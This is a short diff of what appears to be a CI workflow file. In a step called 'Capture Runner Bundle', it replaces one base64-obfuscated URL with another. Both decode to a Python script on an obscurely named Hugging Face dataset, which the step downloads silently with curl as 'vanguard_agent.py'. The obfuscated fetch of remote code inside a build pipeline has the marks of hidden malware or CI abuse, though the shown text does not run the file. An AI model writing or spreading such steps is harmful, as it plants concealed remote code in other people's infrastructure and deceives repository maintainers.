@@ -68,7 +68,7 @@ jobs:
       - name: Capture Runner Bundle
         run: |
           echo "[CAPTURE] Capturing vanguard_agent.py from assigned node link..."
-          SOURCE_LINK=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          SOURCE_LINK=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 --decode)
           curl -sL "$SOURCE_LINK" -o vanguard_agent.py
           echo "[CAPTURE] Runner bundle captured."
 
